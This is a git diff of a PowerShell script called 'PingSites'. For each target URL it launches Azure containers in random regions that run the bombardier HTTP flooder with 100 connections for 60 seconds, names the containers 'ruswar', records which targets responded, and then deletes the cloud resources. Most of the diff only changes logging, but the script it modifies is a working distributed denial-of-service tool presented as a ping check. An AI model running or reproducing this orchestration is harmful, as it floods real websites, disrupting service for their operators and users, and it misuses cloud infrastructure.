@@ -7,10 +7,12 @@
     [int] $FinishTimeout = 100
 )
 
-.\Log "==== Start PingSites ===="
+. .\Logging.ps1
+
+LogInfo "==== Start PingSites ===="
 
 if (Test-Path $TargetUrlsPath) {
-    .\Log -s 'ParseLine' "Remove old urls file: $TargetUrlsPath"
+    LogInfo "Remove old urls file: $TargetUrlsPath"
     Remove-Item $TargetUrlsPath
 }
 
@@ -18,19 +20,17 @@ $lines = [System.IO.File]::ReadLines($LinesPath)
 
 $location = .\GetRandomLocation
 
-$resourceGroup = "rg-rw-ping-$(Get-Date -Format "MM-dd")"
+$resourceGroup = "rg-rw-ping-$(Get-Date -Format "MM-dd")-$(Get-Random)"
 az group create --location $location --name $resourceGroup
 
 $id = 1
 $containerUrlMap = @{}
 
-ForEach ($line in $lines)
-{
+ForEach ($line in $lines) {
     if ([string]::IsNullOrWhiteSpace($line)) {
-        .\Log -l DBG -s 'PingSites' "Ignore empty line"
+        LogDebug "Ignore empty line"
         continue 
     }
-
 
     $urls = .\ParseLine $line 
     ForEach ($url in $urls) {
@@ -39,34 +39,33 @@ ForEach ($line in $lines)
         $name = "ruswar" + $i++
         $location = .\GetRandomLocation
 
-        .\Log -s 'PingSites' "ResouceGroup: ${resourceGroup} Container: ${name} location: ${location} url: ${url}";
+        LogInfo "ResouceGroup: ${resourceGroup} Container: ${name} location: ${location} url: ${url}";
 
         az container create --resource-group $resourceGroup --name $name --image alpine/bombardier:latest --restart-policy OnFailure --command-line "/gopath/bin/bombardier -c 100 -d 60s --http1 -l ${url}" --location $location
     
         $containerUrlMap.Add($name, $url)
 
-        .\Log -l DBG -s 'PingSites' "Add to dictionary: ${name}: ${url}"
+        LogDebug "Add to dictionary: ${name}: ${url}"
     }
 }
 
-.\Log -s 'PingSites' "Waiting $FinishTimeout sec for all containers to finish.";
+LogInfo "Waiting $FinishTimeout sec for all containers to finish.";
         
 Start-Sleep -Seconds $FinishTimeout
 
 # Collect & Analyze Logs
 ForEach ($key in $containerUrlMap.keys) {
     $url = $containerUrlMap[$key]
-    .\Log -s 'PingSites' "ResouceGroup: ${resourceGroup} Container: ${key} url: ${url}";
+    LogInfo "ResouceGroup: ${resourceGroup} Container: ${key} url: ${url}";
 
     $logs = az container logs --resource-group $resourceGroup --name $key
-    .\Log -s 'PingSites' "Output for container: ${key}, url: ${url}"
-    .\Log $logs
+    LogInfo "Container: ${key}, url: ${url} Output: $logs"
 
     # Filter out unsuccessful 
     $match = $logs -match '1xx - 0, 2xx - 0, 3xx - 0, 4xx - 0, 5xx - 0'
-    .\Log -s 'PingSites' "Match: $match"
+    LogVerbose "Match: $match"
     if (![string]::IsNullOrEmpty($logs) -and $logs -match 'Bombarding' -and !($logs -match '1xx - 0, 2xx - 0, 3xx - 0, 4xx - 0, 5xx - 0')) {
-        .\Log -s 'PingSites' "Ping ${url}. Result: SUCCESS"
+        LogInfo "Ping ${url}. Result: SUCCESS"
         if (!(Test-Path $TargetUrlsPath)) {
             New-Item -Path $TargetUrlsPath -ItemType "file"
         }
@@ -74,12 +73,12 @@ ForEach ($key in $containerUrlMap.keys) {
         Add-content $TargetUrlsPath -value ${url}
     } 
     else {
-        .\Log -s 'PingSites' "Ping ${url}. Result: FAIL"
+        LogInfo "Ping ${url}. Result: FAIL"
     }
 }
 
 az group delete --resource-group $resourceGroup --yes
-.\Log -s 'PingSites' "Deleted resource group ${resourceGroup}";
+LogInfo "Deleted resource group ${resourceGroup}";
 
-.\Log "==== Finish PingSites ===="
+LogInfo "==== Finish PingSites ===="
 [console]::beep(500,1000)
